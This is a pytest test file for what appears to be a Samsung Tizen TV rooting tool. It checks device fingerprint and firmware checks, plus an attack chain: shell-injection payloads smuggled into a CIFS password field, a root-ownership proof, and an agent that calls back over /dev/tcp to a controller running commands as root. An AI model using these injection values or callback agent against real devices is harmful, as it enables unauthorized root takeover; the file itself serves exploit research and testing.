import base64
import hashlib
import socket
import threading
from pathlib import Path, PurePosixPath

import pytest

from tizenpwn import tu7000
from tizenpwn.sdb import SdbError
from tizenpwn.tu7000 import (
    ARTIFACT_HASHES,
    MODEL,
    PROBE_COMMAND,
    SYSTEM_HASH_COMMAND,
    AgentServer,
    CifsRouteError,
    CifsRunIdentity,
    agent_code,
    assess_target,
    classify_uid0_once,
    fresh_agent_identity,
    fresh_identity,
    lab_context_sha256,
    uid0_predicate,
)


def probe_output(*, build: str, hashes: dict[str, str]) -> str:
    hash_lines = "".join(
        f"{value}  {path}\n" for path, value in hashes.items()
    )
    return (
        "uid=901(sdk) gid=901(sdk)\n"
        "TIZENPWN_KERNEL=4.1.10\n"
        "TIZENPWN_ARCHITECTURE=armv7l\n"
        "Tizen5/TV 5.5.0 (arm)\n"
        f"BUILD_ID={build}\n"
        "TIZENPWN_CAPABILITY_PS_AGENT=ready\n"
        "TIZENPWN_CAPABILITY_MOUNT_SMB=ready\n"
        "TIZENPWN_CAPABILITY_REMOTEPC=ready\n"
        f"{hash_lines}"
        "[exit:0]"
    )


class FakeClient:
    def __init__(
        self,
        *,
        model: str = MODEL,
        output: str | None = None,
        proof: bool = False,
    ) -> None:
        self.model = model
        self.output = output
        self.proof = proof
        self.injections: list[str] = []
        self.stage_exists = False
        self.stage_file = False

    def connect(self) -> None:
        pass

    def require_device(self) -> None:
        pass

    def reported_model(self) -> str:
        return self.model

    def require_shell_injection(self) -> None:
        pass

    def capture(self, command: str, *, timeout: float) -> object:
        if command == SYSTEM_HASH_COMMAND:
            text = "a" * 64 + "  /etc/passwd\n[exit:0]"
        elif command == PROBE_COMMAND:
            text = self.output or probe_output(
                build=tu7000.TESTED_BUILD,
                hashes=ARTIFACT_HASHES,
            )
        else:
            text = "absent\n[exit:0]"
        return type("Result", (), {"output": text, "transport_returncode": 0})()

    def inject(self, command: str, *, timeout: float) -> object:
        self.injections.append(command)
        self.stage_exists = self.proof
        return type("Result", (), {"returncode": 0})()

    def push(self, local_path: Path, remote_path: PurePosixPath) -> None:
        destination = str(remote_path)
        if destination.endswith("/attest"):
            if not self.stage_exists:
                raise SdbError(
                    "sdb push attest failed with exit 0: "
                    "error: failed to close "
                    f"'{destination}': Not a directory"
                )
            return
        if self.stage_exists:
            return
        self.stage_file = True


def test_fresh_identity_matches_lab_patterns() -> None:
    identity = fresh_identity()

    assert identity.password == (
        f"$(/usr/bin/id>{identity.marker})"
    )
    assert identity.marker.startswith("/home/owner/share/tmp/sr-")
    assert identity.share.startswith("TVROOT")
    assert identity.stage.startswith(
        "/home/owner/share/tmp/sdk_tools/r"
    )


def test_predicate_requires_regular_root_owned_marker_before_stage() -> None:
    identity = fresh_identity()
    predicate = uid0_predicate(identity)

    assert f"[ -f {identity.marker} ]" in predicate
    assert f"[ \"$(stat -c %u {identity.marker})\" = 0 ]" in predicate
    assert "grep -q '^uid=0(root) gid=0(root)'" in predicate
    assert predicate.endswith(f"mkdir {identity.stage}")


def test_exact_target_assessment_verifies_reviewed_artifacts() -> None:
    assessment = assess_target("192.0.2.10", client=FakeClient())

    assert assessment.model == MODEL
    assert (
        assessment.compatibility.fingerprint.build_id
        == tu7000.TESTED_BUILD
    )
    assert all(artifact.verified for artifact in assessment.artifacts)


def test_assessment_rejects_another_model_before_live_work() -> None:
    with pytest.raises(CifsRouteError, match="expected UN65TU7000FXZA"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(model="GQ55Q60TGUXZG"),
        )


def test_assessment_rejects_artifact_hash_mismatch() -> None:
    hashes = dict(ARTIFACT_HASHES)
    first = next(iter(hashes))
    hashes[first] = "0" * 64

    with pytest.raises(CifsRouteError, match="artifact hashes did not match"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(
                output=probe_output(
                    build=tu7000.TESTED_BUILD, hashes=hashes
                )
            ),
        )


def test_assessment_rejects_a_different_build() -> None:
    with pytest.raises(CifsRouteError, match="requires the tested build"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(
                output=probe_output(
                    build="T-KTSU2AKUC-REL-202701010101",
                    hashes=ARTIFACT_HASHES,
                )
            ),
        )


def test_classifier_accepts_the_two_push_directory_shape() -> None:
    client = FakeClient(proof=True)
    identity = fresh_identity()

    assert classify_uid0_once(client, identity) is True
    assert client.injections == [uid0_predicate(identity)]


def test_classifier_rejects_a_created_file_without_retry() -> None:
    client = FakeClient(proof=False)
    identity = fresh_identity()

    assert classify_uid0_once(client, identity) is False
    assert len(client.injections) == 1


def test_identity_rejects_unsafe_paths() -> None:
    identity = CifsRunIdentity(
        run_id="0" * 16,
        marker="/tmp/../etc/passwd",
        share="TVROOT00000000",
        stage="/home/owner/share/tmp/sdk_tools/r" + "0" * 16,
        container="tizenpwn-cifs-" + "0" * 16,
    )

    with pytest.raises(CifsRouteError, match="marker path"):
        uid0_predicate(identity)


def test_lab_context_hash_is_stable_and_content_addressed() -> None:
    first = lab_context_sha256()
    second = lab_context_sha256()

    assert first == second
    assert len(first) == 64


def test_agent_identity_password_is_a_bounded_shell_injection() -> None:
    identity = fresh_agent_identity()

    assert identity.password.startswith(':;bash$IFS-c$IFS"$(cat$IFS')
    assert identity.path in identity.password
    assert identity.password.endswith(')"')
    assert " " not in identity.password


def test_agent_code_contains_callback_secret_and_protocol() -> None:
    identity = fresh_agent_identity()
    code = agent_code(identity, "192.0.2.10", 4567)

    assert "/dev/tcp/192.0.2.10/4567" in code
    assert identity.secret in code
    assert "sha256sum" in code
    assert "base64 -d" in code
    assert "__EXIT__" in code


def test_agent_server_accepts_a_valid_challenge() -> None:
    identity = fresh_agent_identity()
    server = AgentServer("127.0.0.1", identity.secret)
    observed: dict[str, str] = {}

    def tv_side() -> None:
        with socket.create_connection(
            ("127.0.0.1", server.port), timeout=5
        ) as connection:
            reader = connection.makefile("rb")
            writer = connection.makefile("wb")
            nonce = reader.readline().decode("ascii").strip()
            digest = hashlib.sha256(
                (nonce + identity.secret).encode("ascii")
            ).hexdigest()
            writer.write((digest + "\n").encode("ascii"))
            writer.write(b"IDENTITY uid=0(root) gid=0(root)\n")
            writer.flush()
            command = base64.b64decode(
                reader.readline().decode("ascii")
            ).decode("utf-8")
            observed["command"] = command
            writer.write(
                (
                    "RESULT 0 "
                    + base64.b64encode(b"root-output").decode("ascii")
                    + "\n"
                ).encode("ascii")
            )
            writer.flush()
            observed["exit"] = reader.readline().decode("ascii").strip()

    thread = threading.Thread(target=tv_side)
    thread.start()
    try:
        root_identity, results = server.accept_and_run(("id",), timeout=5)
    finally:
        server.close()
        thread.join(timeout=5)

    assert root_identity == "uid=0(root) gid=0(root)"
    assert results == [
        {"command": "id", "exit_code": 0, "stdout": "root-output"}
    ]
    assert observed == {"command": "id", "exit": "__EXIT__"}


def test_agent_server_rejects_a_bad_challenge() -> None:
    identity = fresh_agent_identity()
    server = AgentServer("127.0.0.1", identity.secret)

    def tv_side() -> None:
        with socket.create_connection(
            ("127.0.0.1", server.port), timeout=5
        ) as connection:
            reader = connection.makefile("rb")
            writer = connection.makefile("wb")
            reader.readline()
            writer.write(b"0" * 64 + b"\n")
            writer.flush()

    thread = threading.Thread(target=tv_side)
    thread.start()
    try:
        with pytest.raises(CifsRouteError, match="shared-secret challenge"):
            server.accept_and_run(("id",), timeout=5)
    finally:
        server.close()
        thread.join(timeout=5)


def test_cifs_lab_accepts_an_agent_identity() -> None:
    identity = fresh_agent_identity()

    lab = tu7000.CifsLab(
        identity,
        bind="192.0.2.10",
        rdp_port=3389,
        smb_port=445,
    )

    assert lab.identity.password == identity.password


def eu_client(*, build=tu7000.EU_BUILD, hashes=None, **changes):
    output = probe_output(
        build=build, hashes=ARTIFACT_HASHES if hashes is None else hashes
    )
    for old, new in changes.items():
        output = output.replace(old, new)
    return FakeClient(model=tu7000.EU_MODEL, output=output)


def test_eu_requires_explicit_opt_in():
    with pytest.raises(CifsRouteError, match="expected UN65TU7000FXZA"):
        assess_target("192.0.2.10", client=eu_client())


def test_eu_assessment_does_not_claim_validated_root_or_tested_build():
    result = assess_target(
        "192.0.2.10", client=eu_client(), experimental_eu=True
    )
    assert result.compatibility.status.value == "compatible-untested"
    assert result.to_dict()["firmware"] == tu7000.EU_FIRMWARE
    assert result.to_dict()["root_validated_by_preflight"] is False
    assert result.to_dict()["experimental_eu"] is True
    assert all(artifact.verified for artifact in result.artifacts)
    assert tu7000.EU_FIRMWARE in result.render()


@pytest.mark.parametrize("build", [tu7000.TESTED_BUILD, "T-KTSU2DEUC-REL-202701010101"])
@pytest.mark.parametrize("require_tested", [True, False])
def test_eu_rejects_other_builds_even_without_require_tested(build, require_tested):
    with pytest.raises(CifsRouteError):
        assess_target(
            "192.0.2.10", client=eu_client(build=build),
            experimental_eu=True, require_tested=require_tested,
        )


@pytest.mark.parametrize("path", ARTIFACT_HASHES)
@pytest.mark.parametrize("missing", [True, False])
def test_eu_rejects_missing_or_changed_artifacts(path, missing):
    hashes = dict(ARTIFACT_HASHES)
    if missing:
        del hashes[path]
    else:
        hashes[path] = "0" * 64
    with pytest.raises(CifsRouteError, match="artifact hashes did not match"):
        assess_target(
            "192.0.2.10", client=eu_client(hashes=hashes), experimental_eu=True
        )


@pytest.mark.parametrize("old,new", [
    ("uid=901", "uid=0"),
    ("4.1.10", "5.4.0"),
    ("4.1.10", "4.1.11"),
    ("armv7l", "aarch64"),
    ("Tizen5/TV 5.5.0", "Tizen6/TV 6.0.0"),
    ("PS_AGENT=ready", "PS_AGENT=missing"),
    ("MOUNT_SMB=ready", "MOUNT_SMB=missing"),
    ("REMOTEPC=ready", "REMOTEPC=missing"),
])
def test_eu_preserves_runtime_checks(old, new):
    with pytest.raises(CifsRouteError):
        assess_target(
            "192.0.2.10", client=eu_client(**{old: new}), experimental_eu=True
        )


def test_eu_option_rejects_us_model():
    with pytest.raises(CifsRouteError, match="expected UE55TU7092UXXH"):
        assess_target("192.0.2.10", client=FakeClient(), experimental_eu=True)


@pytest.mark.parametrize("execute,extra", [
    (tu7000.execute_probe, {}),
    (tu7000.execute_command, {"commands": ("id",)}),
])
def test_eu_live_mode_rejects_us_confirmation_before_connection(execute, extra):
    with pytest.raises(CifsRouteError, match=tu7000.EU_CONFIRMATION):
        execute(
            "192.0.2.10", confirm=tu7000.CONFIRMATION,
            accept_saved_profile=True, experimental_eu=True, **extra,
        )
